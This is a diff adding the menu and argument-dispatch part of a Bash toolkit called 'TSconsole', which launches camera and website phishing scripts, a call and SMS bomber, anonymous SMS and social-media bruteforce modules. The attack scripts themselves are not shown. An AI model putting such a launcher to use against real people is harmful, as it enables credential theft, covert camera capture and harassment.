+if [[ ${userc} == 'back' ]]; then
+bash assets/load.sh "" "              " 1
+echo
+break
+elif [[ ${userc} == 'exit' || ${userc} == 'quit' ]]; then
+bash assets/load.sh Exiting "                    " 1
+echo
+exit 0
+break
+elif [[ ${userc,,} == 'help' || ${userc} == '?' ]]; then
+printf "${S1}(${S5}•${S1})${S7} help ${S1}::${S7} execute ‘${S4}list${S7}’ to show submodules${R0}\n"
+elif [[ ${userc,,} == 'show options' ]]; then
+bash assets/load.sh "" "          " 1
+echo -e "
+=============================
+     ${B1}Available options:-${R1}
+=============================
+    Options                      Description
+    -------                      -----------
+   ${S6} list${R0}         |->   To show submodules
+   ${S6} quit or exit${R0} |->   To exit TSconsole!!.
+   ${S6} help${R0}         |->   To show help message
+   ${S6} back${R0}         |->   To go back in main promt
+" | pv -qL 1000
+elif [[ ${userc,,} == 'list' ]]; then
+bash assets/load.sh "" "            " 1
+echo -e "
+======================
+     ${B1}Submodules:-${R1}
+======================
+${S1}(${S7}01${S1})${S7}base64${R0}
+${S1}(${S7}02${S1})${S7}base32${R0}
+${S1}(${S7}03${S1})${S7}binary digits(0 1)${R0}
+" | pv -qL 1000
+elif [[ ${userc} == '01' || ${userc} == '1' ]]; then
+bash programs/binaryencode/base64
+elif [[ ${userc} == '02' || ${userc} == '2' ]]; then
+bash programs/binaryencode/base32
+elif [[ ${userc} == '03' || ${userc} == '3' ]]; then
+python programs/binaryencode/binary -H suman -P BHUTUU
+else
+printf "${S2}[${S1}!${S2}]${S7}Unsatisfied command ‘${S4}${userc}${S7}’ ${S1}:: ${S7}execute ‘?’ or ‘help’${R0}\n"
+fi
+done
+}
+#<==========camera phish============>#
+cameraPhish() {
+while true; do
+printf "\033[3;4;37mTSc\033[0;0;00m ${S7}use(${S1}program/phish/camera${S7})> ${R0}"
+read userc
+if [[ ${userc} == 'back' ]]; then
+bash assets/load.sh "" "              " 1
+echo
+break
+elif [[ ${userc} == 'exit' || ${userc} == 'quit' ]]; then
+bash assets/load.sh Exiting "                    " 1
+echo
+exit 0
+break
+elif [[ ${userc,,} == 'help' || ${userc} == '?' ]]; then
+printf "${S1}(${S5}•${S1})${S7} help ${S1}::${S7} execute ‘${S4}run${S7}’ to use this program${R0}\n"
+elif [[ ${userc,,} == 'show options' ]]; then
+bash assets/load.sh "" "          " 1
+echo -e "
+=============================
+     ${B1}Available options:-${R1}
+=============================
+    Options                      Description
+    -------                      -----------
+   ${S6} run${R0}          |->   To run this program
+   ${S6} quit or exit${R0} |->   To exit TSconsole!!.
+   ${S6} help${R0}         |->   To show help message
+   ${S6} back${R0}         |->   To go back in main promt
+" | pv -qL 1000
+elif [[ ${userc,,} == 'list' ]]; then
+printf "${S1}(${S5}!${S1})${S7}unsatisfied option ‘${S4}list${S7}’ ${S1}::${S7} execute ‘${S4}run${S7}’ to use this program${R0}\n"
 
+elif [[ ${userc} == 'run' ]]; then
+bash programs/phishcamera/phish
+else
+printf "${S2}[${S1}!${S2}]${S7}Unsatisfied command ‘${S4}${userc}${S7}’ ${S1}:: ${S7}execute ‘?’ or ‘help’${R0}\n"
+fi
+done
+}
+#<============website phish==============>#
+webPhish() {
+while true; do
+printf "\033[3;4;37mTSc\033[0;0;00m ${S7}use(${S1}program/phish/websites${S7})> ${R0}"
+read userc
+if [[ ${userc} == 'back' ]]; then
+bash assets/load.sh "" "              " 1
+echo
+break
+elif [[ ${userc} == 'exit' || ${userc} == 'quit' ]]; then
+bash assets/load.sh Exiting "                    " 1
+echo
+exit 0
+break
+elif [[ ${userc,,} == 'help' || ${userc} == '?' ]]; then
+printf "${S1}(${S5}•${S1})${S7} help ${S1}::${S7} execute ‘${S4}run${S7}’ to use this program${R0}\n"
+elif [[ ${userc,,} == 'show options' ]]; then
+bash assets/load.sh "" "          " 1
+echo -e "
+=============================
+     ${B1}Available options:-${R1}
+=============================
+    Options                      Description
+    -------                      -----------
+   ${S6} run${R0}          |->   To run this program
+   ${S6} quit or exit${R0} |->   To exit TSconsole!!.
+   ${S6} help${R0}         |->   To show help message
+   ${S6} back${R0}         |->   To go back in main promt
+" | pv -qL 1000
+elif [[ ${userc,,} == 'list' ]]; then
+printf "${S1}(${S5}!${S1})${S7}unsatisfied option ‘${S4}list${S7}’ ${S1}::${S7} execute ‘${S4}run${S7}’ to use this program${R0}\n"
+
+elif [[ ${userc} == 'run' ]]; then
+bash programs/phishweb/phish
+else
+printf "${S2}[${S1}!${S2}]${S7}Unsatisfied command ‘${S4}${userc}${S7}’ ${S1}:: ${S7}execute ‘?’ or ‘help’${R0}\n"
+fi
+done
+}
+
+#<===========call and sms bomber============>#
+bombSpam() {
+while true; do
+printf "\033[3;4;37mTSc\033[0;0;00m ${S7}use(${S1}program/spam/call-sms${S7})> ${R0}"
+read userc
+if [[ ${userc} == 'back' ]]; then
+bash assets/load.sh "" "              " 1
+echo
+break
+elif [[ ${userc} == 'exit' || ${userc} == 'quit' ]]; then
+bash assets/load.sh Exiting "                    " 1
+echo
+exit 0
+break
+elif [[ ${userc,,} == 'help' || ${userc} == '?' ]]; then
+printf "${S1}(${S5}•${S1})${S7} help ${S1}::${S7} execute ‘${S4}list${S7}’ to show submodules${R0}\n"
+elif [[ ${userc,,} == 'show options' ]]; then
+bash assets/load.sh "" "          " 1
+echo -e "
+=============================
+     ${B1}Available options:-${R1}
+=============================
+    Options                      Description
+    -------                      -----------
+   ${S6} list${R0}         |->   To show submodules
+   ${S6} quit or exit${R0} |->   To exit TSconsole!!.
+   ${S6} help${R0}         |->   To show help message
+   ${S6} back${R0}         |->   To go back in main promt
+" | pv -qL 1000
+elif [[ ${userc,,} == 'list' ]]; then
+bash assets/load.sh "" "            " 1
+echo -e "
+======================
+     ${B1}Submodules:-${R1}
+======================
+${S1}(${S7}01${S1})${S7}Call & SMS bomber${R0}
+${S1}(${S7}02${S1})${S7}Anonymous text SMS${R0}
+" | pv -qL 1000
+elif [[ ${userc} == '01' || ${userc} == '1' ]]; then
+./programs/callnsms/bomb.sh
+elif [[ ${userc} == '02' || ${userc} == '2' ]]; then
+bash programs/callnsms/text.sh
+else
+printf "${S2}[${S1}!${S2}]${S7}Unsatisfied command ‘${S4}${userc}${S7}’ ${S1}:: ${S7}execute ‘?’ or ‘help’${R0}\n"
+fi
+done
+}
+
+
+
+
+
+
+#++++++argunentation help menue+++++#
+mainHelp() {
+bash assets/load.sh "" "            " 1
+echo -e "
+============================
+     ${B1}Argumentation help${R1}
+============================
+${S6}Use${R0}:
+    ${S3}TSconsole ${S5}-argument ${S7}subargument${R0}
+${S1}Or${R0}
+    ${S3} TSconsole ${S5}--argument ${S7}subargument${R0}
+
+${S6}Available argument${R0}:
+
+   ${S5}-b ${S7}[option] ${S7}or ${S5}--brute ${S7}[option]${R0}   |--> For using brutforce programs
+   ${S5}-d ${S7}[option] ${S7}or ${S5}--decode ${S7}[option]${R0}  |--> For using decoder programs
+   ${S5}-e ${S7}[option] ${S7}or ${S5}--encode ${S7}[option]${R0}  |--> For using encoder programs
+
+   ${S5}--debug${R0}                 |--> To run the program in debug mode
+   ${S5}-u ${S7}or ${S5}--update${R0}          |--> To update TSconsole-framework
+   ${S5}-i ${S7}or ${S5}--install${R0}         |--> To install TSconsole-framework
+   ${S5}-h ${S7}or ${S5}--help${R0}            |--> For argumentation help
+${S2}<${S1}-------${S4}x${S1}-------${S2}>${R0}
+" | pv -qL 1000
+}
+
+#brute help
+bruteHelp() {
+bash assets/load.sh "" "               " 1
+echo -e "
+=============================
+     ${B1}Bruteforce programs${R1}
+=============================
+
+  ${S5}-b ${S7}or ${S5}--brute ${S7}[option]${R0}
+
+${S4}Available options${R0}:
+
+        ${S2} social-media${R0}        |--> For using social-media bruteforce
+        ${S2} hashes${R0}              |--> For using hashes bruteforce
+${S2}<${S1}-------${S4}x${S1}-------${S2}>${R0}
+" | pv -qL 1000
+}
+
+
+encodeHelp() {
+bash assets/load.sh "" "               " 1
+echo -e "
+=============================
+     ${B1}Encryption programs${R1}
+=============================
+
+  ${S5}-e ${S7}or ${S5}--encode ${S7}[option]${R0}
+
+${S4}Available options${R0}:
+
+        ${S2} hashes${R0}              |--> For using hashes encoder
+        ${S2} binary${R0}              |--> For using binary encoder
+${S2}<${S1}-------${S4}x${S1}-------${S2}>${R0}
+" | pv -qL 1000
+}
+
+decodeHelp() {
+bash assets/load.sh "" "               " 1
+echo -e "
+=============================
+     ${B1}decryption programs${R1}
+=============================
+
+  ${S5}-d ${S7}or ${S5}--decode ${S7}[option]${R0}
+
+${S4}Available options${R0}:
+
+        ${S2} binary${R0}              |--> For using binary encoder
+
+${S1}Note:-${S4}under binary you have again three submodules ${S7}i.e,${R0}
+
+        ${S3}base64${R0}
+        ${S3}base32${R0}
+        ${S3}binary digits (0 1)${R0}
+${S2}<${S1}-------${S4}x${S1}-------${S2}>${R0}
+" | pv -qL 1000
+}
+
+phishHelp() {
+bash assets/load.sh "" "               " 1
+echo -e "
+=============================
+     ${B1}Phishing programs${R1}
+=============================
+
+  ${S5}-p ${S7}or ${S5}--phish ${S7}[option]${R0}
+
+${S4}Available options${R0}:
+
+        ${S2} camera${R0}              |--> For using camera phishing
+        ${S2} website or webpage${R0}  |--> For using website phishing
+${S2}<${S1}-------${S4}x${S1}-------${S2}>${R0}
+" | pv -qL 1000
+}
+
+spamHelp() {
+bash assets/load.sh "" "               " 1
+echo -e "
+=============================
+     ${B1}Spamming programs${R1}
+=============================
+
+  ${S5}-s ${S7}or ${S5}--spam ${S7}[option]${R0}
+
+${S4}Available options${R0}:
+
+        ${S2} call-sms${R0}              |--> For using call-sms spam program
+
+${S2}<${S1}-------${S4}x${S1}-------${S2}>${R0}
+" | pv -qL 1000
+}
+
+
+#<main + arguments + section>#
+if [[ ${filter} == 'TSconsole -u' || ${filter} == 'TSconsole --update' ]]; then
+INTERNET
+git pull
+elif [[ ${filter} == 'TSconsole -i' || ${filter} == 'TSconsole --install' ]]; then
+bash assets/programs/setup.TSconsole
+elif [[ ${filter} == 'TSconsole -r' || ${filter} == 'TSconsole --remove' ]]; then
+bash assets/programs/remove.TSconsole
+#======args for bruteforce prograns======#
+elif [[ $1 == '--brute' || $1 == '-b' ]]; then
+  if [[ $2 == 'social-media' ]]; then
+   bash assets/load.sh "" "               " 1
+   echo
+   socialBrute
+  elif [[ $2 == 'hashes' ]]; then
+   bash assets/load.sh "" "               " 1
+   echo
+   hashBrute
+  elif [[ $2 == 'help' || $2 == '?' || $2 == 'h' ]]; then
+   bruteHelp
+  else
+   printf "${S2}[${S1}!${S2}]${S7}Unsatisfied argument ‘${S4}${2}’${S7} :: execute ‘TSconsole -b ?’ or ‘TSconsole --brute help’${R0}\n"
+  fi
+#---x---#
+#=======args for encoder programs========#
+elif [[ $1 == '--encode' || $1 == '-e' ]]; then
+  if [[ $2 == 'hashes' ]];  then
+    bash assets/load.sh "" "              " 1
+    echo
+    hashEncode
+  elif [[ $2 == 'binary' ]]; then
+    bash assets/load.sh "" "              " 1
+    echo
+    binaryEncode
+  elif [[ $2 == 'help' || $2 == '?' || $2 == 'h' ]]; then
+   bash assets/load.sh "" "               " 1
+   encodeHelp
+  else
+    printf "${S2}[${S1}!${S2}]${S7}Unsatisfied argument ‘${S4}${2}’${S7} :: execute ‘TSconsole -e ?’ or ‘TSconsole --encode help’${R0}\n"
+  fi
+#---x---#
+#+++++++args for decoder programs++++++++#
+elif [[ $1 == '--decode' || $1 == '-d' ]]; then
+  if [[ $2 == 'binary' ]];  then
+    bash assets/load.sh "" "              " 1
+    echo
+    binaryDecode
+  elif [[ $2 == 'help' || $2 == '?' || $2 == 'h' ]]; then
+   bash assets/load.sh "" "                " 1
+   decodeHelp
+  else
+    printf "${S2}[${S1}!${S2}]${S7}Unsatisfied argument ‘${S4}${2}’${S7} :: execute ‘TSconsole -d ?’ or ‘TSconsole --decode help’${R0}\n"
+  fi
+#---x---#
+#++++++++++args for phish programs+++++++++#
+elif [[ $1 == '--phish' || $1 == '-p' ]]; then
+  if [[ $2 == 'camera' ]];  then
+    bash assets/load.sh "" "              " 1
+    echo
+    cameraPhish
+  elif [[ $2 == 'website' || $2 == 'webpage' ]]; then
+    bash assets/load.sh "" "             " 1
+    echo
+    webPhish
+  elif [[ $2 == 'help' || $2 == '?' || $2 == 'h' ]]; then
+   phishHelp
+  else
+    printf "${S2}[${S1}!${S2}]${S7}Unsatisfied argument ‘${S4}${2}’${S7} :: execute ‘TSconsole -p ?’ or ‘TSconsole --phish help’${R0}\n"
+  fi
+#---x---#
+#++++++++++args for spam programs+++++++++++#
+elif [[ $1 == '--spam' || $1 == '-s' ]]; then
+  if [[ $2 == 'call-sms' ]];  then
+    bash assets/load.sh "" "              " 1
+    echo
+    bombSpam
+  elif [[ $2 == 'help' || $2 == '?' || $2 == 'h' ]]; then
+   spamHelp
+  else
+    printf "${S2}[${S1}!${S2}]${S7}Unsatisfied argument ‘${S4}${2}’${S7} :: execute ‘TSconsole -s ?’ or ‘TSconsole --spam help’${R0}\n"
+  fi
+#---x---#
+
+
+
+
+#<<<++args for debug and help++>>>#
+elif [[ ${filter} == 'TSconsole --debug' ]]; then
+ set -x
+ main
+elif [[ -z "$1" ]]; then
+ if [[ -z "$2" ]]; then
+ main
+ fi
+elif [[ $1 == '-h' || $1 == '--help' || $1 == '?' ]]; then
+ bash assets/load.sh "" "               " 1
+ mainHelp
+else
+printf "${S2}[${S1}!${S2}]${S7}Unsatisfied argument ‘${S4}${1}’${S7} :: execute ‘?’ or ‘help’${R0}\n"
+fi
+#<<<++x++>>
+
+
+
+#<----------end---------->#
